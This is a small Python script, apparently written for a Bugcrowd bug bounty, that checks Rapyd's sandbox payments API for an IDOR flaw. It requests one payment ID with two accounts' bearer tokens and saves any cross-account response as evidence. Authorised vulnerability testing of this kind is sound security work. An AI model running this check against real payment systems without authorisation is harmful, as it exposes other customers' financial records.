#!/usr/bin/env python3
"""
Copyright (c) 2025 YOUR_NAME_HERE
Proprietary and Confidential
All Rights Reserved

This software is proprietary and confidential.
Unauthorized copying, modification, or distribution is prohibited.

System ID: BB_20251102_5946
Owner: YOUR_NAME_HERE
"""

import sys, json, requests, os

def test_idor(token_a, token_b, payment_id):
    print(chr(61) * 60)
    print('Quick API IDOR Test - Rapyd')
    print(chr(61) * 60)
    url = f'https://sandboxapi.rapyd.net/v1/payments/{payment_id}'
    print(f'Testing: {url}')
    headers_b = {'Authorization': f'Bearer {token_b}', 'X-Bugcrowd': 'Bugcrowd-DoctorMen'}
    resp_b = requests.get(url, headers=headers_b, timeout=30)
    print(f'Account B: {resp_b.status_code}')
    if resp_b.status_code != 200: return False
    headers_a = {'Authorization': f'Bearer {token_a}', 'X-Bugcrowd': 'Bugcrowd-DoctorMen'}
    resp_a = requests.get(url, headers=headers_a, timeout=30)
    print(f'Account A: {resp_a.status_code}')
    if resp_a.status_code == 200:
        print('VULNERABILITY FOUND!')
        os.makedirs('evidence', exist_ok=True)
        with open(f'evidence/idor_api_{payment_id}.json', 'w') as f:
            json.dump(resp_a.json(), f, indent=2)
        print(f'Saved: evidence/idor_api_{payment_id}.json')
        return True
    print('No vulnerability')
    return False

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Usage: python3 quick_api_test.py TOKEN_A TOKEN_B PAYMENT_ID')
        sys.exit(1)
    test_idor(sys.argv[1], sys.argv[2], sys.argv[3])

# System ID: BB_20251102_5946
# Owner: YOUR_NAME_HERE
# Build Date: 2025-11-02 02:45:55
